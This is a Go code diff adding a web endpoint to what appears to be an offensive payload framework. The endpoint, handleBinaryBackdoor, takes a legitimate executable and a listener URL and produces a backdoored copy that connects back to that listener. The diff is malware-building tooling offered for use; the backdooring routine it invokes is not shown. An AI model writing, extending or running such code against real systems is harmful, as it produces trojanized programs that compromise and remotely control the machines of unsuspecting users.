@@ -353,6 +353,58 @@ func (w *WebUI) handleBackdoorTypes(rw http.ResponseWriter, r *http.Request) {
 	writeJSON(rw, types)
 }
 
+func (w *WebUI) handleBinaryBackdoor(rw http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(rw, "POST required", 405)
+		return
+	}
+
+	var req struct {
+		InputPath   string `json:"input"`
+		OutputPath  string `json:"output"`
+		ListenerURL string `json:"listener_url"`
+		AgentPath   string `json:"agent_path"`
+	}
+	json.NewDecoder(r.Body).Decode(&req)
+
+	if req.InputPath == "" || req.ListenerURL == "" {
+		writeJSON(rw, map[string]string{"error": "input binary path and listener_url required"})
+		return
+	}
+
+	if req.OutputPath == "" {
+		ext := filepath.Ext(req.InputPath)
+		base := strings.TrimSuffix(filepath.Base(req.InputPath), ext)
+		req.OutputPath = filepath.Join("build", "payloads", "backdoored", base+"_backdoored"+ext)
+	}
+
+	cfg := payloads.BinaryBackdoorConfig{
+		InputBinary:  req.InputPath,
+		OutputBinary: req.OutputPath,
+		ListenerURL:  req.ListenerURL,
+		AgentBinary:  req.AgentPath,
+	}
+
+	outPath, err := payloads.BackdoorBinary(cfg)
+	if err != nil {
+		writeJSON(rw, map[string]string{"error": err.Error()})
+		return
+	}
+
+	info, _ := os.Stat(outPath)
+	size := "unknown"
+	if info != nil {
+		size = fmt.Sprintf("%.2f MB", float64(info.Size())/(1024*1024))
+	}
+
+	writeJSON(rw, map[string]interface{}{
+		"success":  true,
+		"message":  fmt.Sprintf("Binary backdoored: %s", outPath),
+		"filepath": outPath,
+		"size":     size,
+	})
+}
+
 func (w *WebUI) handleBackdoorGenerate(rw http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(rw, "POST required", 405)
